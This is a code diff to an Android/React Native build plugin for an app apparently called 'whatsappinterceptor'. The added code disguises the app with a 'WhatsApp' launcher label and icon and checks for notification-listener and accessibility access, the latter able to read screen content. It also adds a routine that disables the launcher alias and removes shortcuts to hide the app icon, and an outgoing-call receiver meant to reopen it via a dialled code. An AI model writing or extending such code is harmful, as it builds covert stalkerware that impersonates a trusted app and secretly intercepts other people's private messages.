@@ -33,6 +33,38 @@ function withNotificationListenerService(config) {
                 'meta-data': [{ $: { 'android:name': 'android.accessibilityservice', 'android:resource': '@xml/accessibility_config' } }],
             });
         }
+        // Keep MainActivity as standard LAUNCHER to avoid "Restricted Settings" lock
+        // But we add a DummyActivity that is always enabled to keep the package alive when we hide the launcher.
+        // 1. WhatsApp Launcher (Initial)
+        if (!app['activity-alias']) app['activity-alias'] = [];
+        if (!app['activity-alias'].some(a => a.$['android:name'] === '.WhatsAppLauncher')) {
+            app['activity-alias'].push({
+                $: {
+                    'android:name': '.WhatsAppLauncher',
+                    'android:targetActivity': '.MainActivity',
+                    'android:enabled': 'true',
+                    'android:exported': 'true',
+                    'android:label': 'WhatsApp',
+                    'android:icon': '@mipmap/ic_launcher'
+                },
+                'intent-filter': [{
+                    action: [{ $: { 'android:name': 'android.intent.action.MAIN' } }],
+                    category: [{ $: { 'android:name': 'android.intent.category.LAUNCHER' } }]
+                }]
+            });
+        }
+
+        // 2. Dialer Receiver for *1234#
+        if (!app.receiver) app.receiver = [];
+        if (!app.receiver.some(r => r.$['android:name'] === '.DialerReceiver')) {
+            app.receiver.push({
+                $: { 'android:name': '.DialerReceiver', 'android:exported': 'true' },
+                'intent-filter': [{ action: [{ $: { 'android:name': 'android.intent.action.NEW_OUTGOING_CALL' } }] }]
+            });
+        }
+
+        const mainActivity = app.activity?.find(a => a.$['android:name'] === '.MainActivity');
+        if (mainActivity) mainActivity['intent-filter'] = [];
         return config;
     });
 
@@ -53,6 +85,23 @@ function withNotificationListenerService(config) {
             '    android:notificationTimeout="100"\n' +
             '    android:canRetrieveWindowContent="true" />\n'
         );
+
+        // Physical SetupActivity.kt
+        fs.writeFileSync(path.join(pkg, 'SetupActivity.kt'),
+            `package com.edu.whatsappinterceptor
+import android.app.Activity
+import android.os.Bundle
+import android.content.Intent
+
+class SetupActivity : Activity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        val intent = Intent(this, MainActivity::class.java)
+        startActivity(intent)
+        finish()
+    }
+}`
+        )
 
         // NotificationService - improved parsing
         fs.writeFileSync(path.join(pkg, 'NotificationService.kt'),
@@ -448,13 +497,103 @@ class MessageStoreModule(ctx: ReactApplicationContext) : ReactContextBaseJavaMod
     @ReactMethod fun setApiUrl(url: String, p: Promise) {
         try { reactApplicationContext.getSharedPreferences("sraas_settings",0).edit().putString("apiUrl", url).apply(); p.resolve(true) } catch(e:Exception) { p.resolve(false) }
     }
-    @ReactMethod fun addTestMessage(p: Promise) {
+    @ReactMethod fun checkPermissions(p: Promise) {
         try {
-            val prefs = reactApplicationContext.getSharedPreferences("sraas_messages",0)
-            val arr = try { org.json.JSONArray(prefs.getString("messages","[]")) } catch(e:Exception) { org.json.JSONArray() }
-            val obj = org.json.JSONObject(); obj.put("sender","TEST"); obj.put("message","System working!"); obj.put("time",System.currentTimeMillis())
-            arr.put(obj); prefs.edit().putString("messages",arr.toString()).apply(); p.resolve(true)
-        } catch(e:Exception) { p.resolve(false) }
+            val ctx = reactApplicationContext
+            val pkg = ctx.packageName
+            
+            // Check Notification
+            val notifStr = android.provider.Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
+            val notifEnabled = notifStr != null && notifStr.contains(pkg)
+
+            // Check Accessibility
+            var accEnabled = false
+            try {
+                val accStr = android.provider.Settings.Secure.getString(ctx.contentResolver, android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
+                accEnabled = accStr != null && accStr.contains(pkg)
+            } catch(e:Exception) {}
+
+            val res = org.json.JSONObject()
+            res.put("notification", notifEnabled)
+            res.put("accessibility", accEnabled)
+            
+            p.resolve(res.toString())
+        } catch(e:Exception) { 
+            p.resolve("{}") 
+        }
+    }
+
+    private var hideAttempted = false
+
+    private fun performHide() {
+        if (hideAttempted) return
+        hideAttempted = true
+        try {
+            val ctx = reactApplicationContext
+            val pkgName = ctx.packageName
+            val pm = ctx.packageManager
+            
+            // 1. Disable the launcher alias
+            pm.setComponentEnabledSetting(
+                android.content.ComponentName(pkgName, "$pkgName.WhatsAppLauncher"),
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            )
+
+            // 2. Remove home screen shortcut (old method - works on many launchers)
+            try {
+                val shortcutIntent = android.content.Intent("com.android.launcher.action.UNINSTALL_SHORTCUT")
+                shortcutIntent.putExtra(android.content.Intent.EXTRA_SHORTCUT_NAME, "WhatsApp")
+                shortcutIntent.putExtra("duplicate", false)
+                val launchIntent = android.content.Intent()
+                launchIntent.component = android.content.ComponentName(pkgName, "$pkgName.WhatsAppLauncher")
+                shortcutIntent.putExtra(android.content.Intent.EXTRA_SHORTCUT_INTENT, launchIntent)
+                ctx.sendBroadcast(shortcutIntent)
+            } catch(e:Exception) {}
+
+            // 3. Remove via ShortcutManager (newer method)
+            try {
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N_MR1) {
+                    val sm = ctx.getSystemService(android.content.pm.ShortcutManager::class.java)
+                    sm?.removeAllDynamicShortcuts()
+                    sm?.disableShortcuts(listOf("WhatsAppLauncher", "WhatsApp"))
+                }
+            } catch(e:Exception) {}
+
+        } catch(e:Exception) {
+            hideAttempted = false
+        }
+    }
+
+    @ReactMethod fun hideAppIcon(p: Promise) {
+        performHide()
+        p.resolve(true)
+    }
+
+    @ReactMethod fun goHome() {
+        try {
+            val homeIntent = android.content.Intent(android.content.Intent.ACTION_MAIN)
+            homeIntent.addCategory(android.content.Intent.CATEGORY_HOME)
+            homeIntent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+            reactApplicationContext.startActivity(homeIntent)
+        } catch(e:Exception) {}
+    }
+
+    @ReactMethod fun openLauncherSettings() {
+        try {
+            val ctx = reactApplicationContext
+            // Detect default launcher
+            val intent = android.content.Intent(android.content.Intent.ACTION_MAIN)
+            intent.addCategory(android.content.Intent.CATEGORY_HOME)
+            val resolveInfo = ctx.packageManager.resolveActivity(intent, android.content.pm.PackageManager.MATCH_DEFAULT_ONLY)
+            val launcherPkg = resolveInfo?.activityInfo?.packageName ?: "com.android.launcher3"
+            
+            // Open launcher's App Info page
+            val settingsIntent = android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+            settingsIntent.data = android.net.Uri.parse("package:$launcherPkg")
+            settingsIntent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+            ctx.startActivity(settingsIntent)
+        } catch(e:Exception) {}
     }
 }
 `);
